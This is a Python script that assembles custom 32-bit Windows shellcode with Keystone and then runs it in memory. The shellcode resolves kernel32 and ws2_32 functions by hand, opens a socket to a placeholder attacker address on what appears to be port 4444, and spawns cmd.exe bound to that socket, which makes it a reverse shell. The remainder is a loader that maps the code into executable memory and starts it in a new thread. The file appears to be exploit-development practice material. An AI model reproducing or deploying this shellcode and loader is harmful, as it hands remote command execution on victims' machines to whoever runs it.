import ctypes, struct
from keystone import *

CODE = (
"	start:		                                    ;"

"	getkernel32:		                            ;"
"		xor ecx, ecx               	                ;"
"		mul ecx                    	                ;"
"		mov eax, [fs:ecx + 0x030]  	                ;"
"		mov eax, [eax + 0x00c]     	                ;"
"		mov esi, [eax + 0x014]     	                ;"
"		lodsd                      	                ;"
"		xchg esi, eax				                ;"
"		lodsd                      	                ;"
"		mov ebx, [eax + 0x10]      	                ;"

"	getAddressofName:	        	                ;"
"		mov edx, [ebx + 0x3c]      	                ;"
"		add edx, ebx				                ;"
"		mov edx, [edx + 0x78]      	                ;"
"		add edx, ebx	                            ;"
"		mov esi, [edx + 0x20]      	                ;"
"		add esi, ebx	                            ;"
"		xor ecx, ecx		                        ;"


"	getProcAddress:		                            ;"
"		inc ecx                             		;"
"		lodsd                               		;"
"		add eax, ebx					          	;"
"		cmp dword [eax], 0x50746547         		;"
"		jnz getProcAddress		                    ;"
"		cmp dword [eax + 0x4], 0x41636F72   		;"
"		jnz getProcAddress		                        ;"
"		cmp dword [eax + 0x8], 0x65726464   		;"
"		jnz getProcAddress		                    ;"

"	getProcAddressFunc:		                        ;"
"		mov esi, [edx + 0x24]       		    ;"
"		add esi, ebx                		    ;"
"		mov cx, [esi + ecx * 2]     		    ;"
"		dec ecx		                            ;"
"		mov esi, [edx + 0x1c]       		    ;"
"		add esi, ebx                		    ;"
"		mov edx, [esi + ecx * 4]    		    ;"
"		add edx, ebx                		    ;"
"		mov ebp, edx                		    ;"

"	getLoadLibraryA:	                    	;"
"		xor ecx, ecx                		    ;"
"		push ecx                    		    ;"
"		push 0x41797261             		    ;"
"		push 0x7262694c             		    ;"
"		push 0x64616f4c             		    ;"
"		push esp	                        	;"
"		push ebx                    		    ;"
"		call edx                    		    ;"


"	getws2_32:	                            	;"
"		push 0x61613233			       		    ;"
"		sub word [esp + 0x2], 0x6161   		    ;"
"		push 0x5f327377 		       		    ;"
"		push esp                       		    ;"
"		call eax 							    ;"
"		mov esi, eax                   		    ;"

"	getWSAStartup:		                        ;"
"		push 0x61617075                 		;"
"		sub word [esp + 0x2], 0x6161    		;"
"		push 0x74726174                 		;"
"		push 0x53415357                 		;"
"		push esp	                    		;"
"		push esi	                    		;"
"		call ebp                        		;"

"	callWSAStartUp:		                        ;"
"		xor edx, edx	                        ;"
"		mov dx, 0x190                           ;"
"		sub esp, edx                            ;"
"		push esp                                ;"
"		push edx                                ;"
"		call eax                                ;"

"	getWSASocketA:		                        ;"
"		push 0x61614174                  		;"
"		sub word [esp + 0x2], 0x6161     		;"
"		push 0x656b636f                  		;"
"		push 0x53415357                  		;"
"		push esp                         		;"
"		push esi                         		;"
"		call ebp                         		;"
"										 		;"
"										 		;"
"	callWSASocketA:                      		;"
"		xor edx, edx		             		;"
"		push edx		                 		;"
"		push edx		                 		;"
"		push edx		                 		;"
"		mov dl, 0x6		                 		;"
"		push edx                         		;"
"		sub dl, 0x5      	             		;"
"		push edx		                 		;"
"		inc edx			                 		;"
"		push edx                         		;"
"		call eax		                 		;"
"		push eax		                 		;"
"		pop edi			                 		;"


"	    getConnect:		                            ;"
"		push 0x61746365                 		;"
"		sub word [esp + 0x3], 0x61      		;"
"		push 0x6e6e6f63                 		;"
"		push esp	                    		;"
"		push esi	                    		;"
"		call ebp                        		;"



"	    callConnect:		                        ;"
"		;set up sockaddr_in  		            ;"
"		mov edx, 0xhhhhhhhh	            		;"
"		sub edx, 0x01010101	            		;"
"		push edx                        		;"
"		push word 0x5c11              		    ;"
"		xor edx, edx	                        ;"
"		mov dl, 2		                        ;"
"		push dx			                        ;"
"		mov edx, esp	                        ;"
"		push byte 0x10	                        ;"
"		push edx		                        ;"
"		push edi		                        ;"
"		call eax		                        ;"


"	    getCreateProcessA:                  		;"
"		xor ecx, ecx 							;"
"		push 0x61614173							;"
"		sub word [esp + 0x2], 0x6161 			;"
"		push 0x7365636f 						;"
"		push 0x72506574							;"
"		push 0x61657243 						;"
"		push esp 								;"
"		push ebx 								;"
"		call ebp 								;"
"		mov esi, ebx                    		;"


"	    shell:                          		;"
"		push 0x61646d63                 		;"
"		sub word [esp + 0x3], 0x61      		;"
"		mov ebx, esp                    		;"
"		push edi                        		;"
"		push edi                        		;"
"		push edi                        		;"
"		xor edi, edi                    		;"
"		push byte 0x12                  		;"
"		pop ecx                         		;"

"	    push_loop:		                        ;"
"		push edi                        		;"
"		loop push_loop                  		;"
"		mov word [esp + 0x3C], 0x0101   		;"
"		mov byte [esp + 0x10], 0x44		        ;"
"		lea ecx, [esp + 0x10]                   ;"

"		push esp              		;"
"		push ecx               		;"
"		push edi             		;"
"		push edi             		;"
"		push edi             		;"
"		inc edi              		;"
"		push edi             		;"
"		dec edi              		;"
"		push edi               		;"
"		push edi               		;"
"		push ebx               		;"
"		push edi               		;"
"		call eax					;"


"	    getExitProcess:		                ;"
"		add esp, 0x010 						;"
"		push 0x61737365						;"
"		sub word [esp + 0x3], 0x61  		;"
"		push 0x636F7250						;"
"		push 0x74697845						;"
"		push esp		                    ;"
"		push esi		                    ;"
"		call ebp                    		;"

"		xor ecx, ecx		                ;"
"		push ecx		                    ;"
"		call eax		                    ;"
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))

print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
